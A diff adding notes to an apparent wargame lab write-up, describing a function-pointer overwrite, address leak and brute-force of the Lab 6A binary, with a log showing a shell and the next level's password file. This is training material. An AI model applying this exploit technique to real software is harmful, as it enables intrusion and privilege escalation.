@@ -362,3 +362,41 @@ p4rti4l_0verwr1tes_r_3nuff
    * We can put 0x20 at +0x16 and +0x17, and try twice to remove it.
 
 * See _lab6B.py_.
+
+### Lab 6A
+* `merchant` struct on stack
+* `ulisting` struct global
+* A bunch of unused structs and functions:
+  * `struct uinfo user`
+  * `struct item aitem`
+  * `write_wrap`
+  * `make_note`
+  * `print_name`.
+* Menu system, where choice 3 calls the function in the local `merchant.sfunc`.
+  * Follows desc in struct
+* trivial buffer overflow in desc into sfunc in `setup_account`.
+* should also be a leak if you fill desc to the brim. We can leak it by overwriting the function pointer in `merchant` with the address to `print_name`.
+  * `print_listing` is at 0xb77XY9e0
+  * `print_name` is at 0xb77XYbe2
+  * We have to brute force the 'Y' nybble.
+* With this leak we can get the address of `__libc_csu_init` which resides right after `merchant` in `main`'s stackframe.
+* `system` is 0x19dc40 bytes before `__libc_csu_init`.
+* See _lab6A.py_.
+
+```bash
+lab6A@warzone:/levels/lab06$ python /tmp/lab6A.py
+[+] Starting program '/levels/lab06/lab6A': Done
+[*] [1596]
+[!] No luck, trying again
+...
+[+] Starting program '/levels/lab06/lab6A': Done
+[*] [1629]
+[*] Leak 0xb7736dd0
+[*] system 0xb7599190
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+Enter your name: Enter your description: Enter Choice: $ id
+uid=1024(lab6A) gid=1025(lab6A) euid=1025(lab6end) groups=1026(lab6end),1001(gameuser),1025(lab6A)
+$ cat ~lab6end/.pass
+eye_gu3ss_0n_@ll_mah_h0m3w3rk
+```
